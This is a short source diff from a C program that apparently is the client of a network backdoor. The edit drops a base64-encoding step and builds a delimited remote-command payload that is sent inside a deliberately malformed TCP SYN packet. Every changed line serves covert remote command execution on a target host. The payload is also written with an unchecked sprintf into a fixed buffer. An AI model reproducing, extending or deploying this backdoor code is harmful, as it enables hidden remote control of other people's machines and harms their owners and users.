@@ -237,12 +237,10 @@ int main(int argc, char **argv) {
   int packet_len;
   // Create delimited payload
   char payload[MAX_RCE_SIZE];
+  sprintf(payload, "%s%s%s", BOOPKIT_RCE_DELIMITER, cfg.rce, BOOPKIT_RCE_DELIMITER);
 
-  // TODO base64 encode
-  size_t payload_encoded_len;
-  char *encoded_payload = base64_encode((const unsigned char *) payload, MAX_RCE_SIZE, &payload_encoded_len);
+  //boopprintf("  -> Full Payload: %s\n", payload);
 
-  sprintf(payload, "%s%s%s", BOOPKIT_RCE_DELIMITER, encoded_payload, BOOPKIT_RCE_DELIMITER);
   // Create a malformed TCP packet with an arbitrary command payload attached to
   // the packet.
   create_bad_syn_packet_payload(&saddr, &daddr, &packet, &packet_len, payload);
